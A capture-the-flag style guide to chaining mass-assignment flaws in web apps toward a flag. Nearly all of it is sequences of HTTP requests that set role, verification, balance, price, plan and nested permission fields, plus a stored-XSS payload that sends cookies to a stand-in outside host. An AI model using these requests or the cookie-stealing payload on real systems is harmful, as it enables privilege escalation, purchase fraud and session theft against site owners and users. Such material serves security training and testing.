# Multi-step chains deep — mass assignment inside longer exploit paths

## The chain grammar

```
bound field  →  stored state  →  decision change  →  resource reach
     ↓              ↓                  ↓                  ↓
role:admin   →  user.role     →  /admin 200       →  admin binder
                                                      ↓
                                             flag_visible:true
                                                      ↓
                                               GET /api/flag
```

Every chain is: bind → store → gate → resource. The bound field is
the edge; the gate is the decision; the resource is the flag.

## Chain 1 — role → admin binder → flag field

```
PATCH /users/me {"role":"admin"}          # edge 1
GET /admin → 200                            # edge 2 — the role opens it
POST /admin/users {"flag_visible":true}     # edge 3 — admin binder's MA
GET /api/flag → flag                        # edge 4
```

The bound `role` is the key; the admin binder is the second mass-
assignment; `flag_visible` is the third write. Three binders deep.

## Chain 2 — verified → gated route → flag

```
POST /register {"verified":true}          # edge 1 — skip verify
GET /api/me → "verified":true             # confirm
GET /flag → flag                          # verify-gated flag
```

The shortest chain — one bound field, one gate, the flag.

## Chain 3 — balance → purchase → flag item

```
PATCH /users/me {"balance":999999}        # edge 1
POST /purchase {"item":"flag"}             # edge 2 — balance suffices
GET /inventory → flag item                 # edge 3
```

## Chain 4 — price → checkout → flag item

```
POST /orders {"item":"flag","price":0}    # edge 1
POST /checkout {"order_id":9}              # edge 2 — total = bound price
GET /orders/9 → flag item "owned"          # edge 3
```

## Chain 5 — author_id → admin feed → XSS → session → flag

```
POST /notes {"author_id":1,
  "content":"<img src=x onerror=fetch('//ev?'+document.cookie)>"}
                                              # edge 1 — forged authorship
→ admin's feed renders the note               # edge 2 — stored XSS
→ admin bot visits → cookie stolen           # edge 3 — into web-xss
→ session rides to /flag                     # edge 4
```

Mass assignment → web-xss → web-auth-session — three classes chained.

## Chain 6 — plan → premium → flag

```
PATCH /users/me {"plan":"enterprise"}     # edge 1
GET /premium → flag                        # edge 2 — plan gate opens
```

## Chain 7 — discriminator → privileged schema → flag

```
PATCH /users/me {"profile":{"_t":"AdminUser","role":"admin"}}
                                              # edge 1 — nested disc.
→ schema switches to AdminUser                # edge 2 — priv fields exist
PATCH /users/me {"clearance":"top"}            # edge 3 — admin field binds
GET /flag                                      # edge 4 — clearance gate
```

## Chain 8 — role → JWT re-issue → flag

```
PATCH /users/me {"role":"admin"}          # edge 1 — stored
POST /logout; POST /login                 # edge 2 — re-issue token
GET /admin → 200                           # edge 3 — token carries role
GET /flag                                  # edge 4
```

The bound field lands in the RE-ISSUED token's claim — the gate reads
the token, not the DB.

## Chain 9 — nested → membership → flag

```
PATCH /users/me {"membership":{"role":"admin","permissions":["*"]}}
                                              # edge 1 — nested assoc
→ membership.role stores                       # edge 2 — child model
GET /admin → 200                               # edge 3 — gate reads it
GET /flag                                      # edge 4
```

The nested-association binder reaches the CHILD model's `role` where
the parent's flat `role` was readonly.

## Chain 10 — import → unguarded binder → flag

```
POST /import [{"username":"x","role":"admin"}]  # edge 1 — bulk binder
GET /api/me → "role":"admin"                    # confirm
GET /admin → flag                                # edge 2
```

The bulk binder's absent allowlist where the per-object form's exists.

## The chain-order rule

Bind FIRST, exercise SECOND — the gate reads the stored state; the
bound field must be in the store before the gated request runs. And
the first edge is always the CHEAPEST binder — `PATCH /me` before
`POST /register` before `/import` before `/admin/*`.
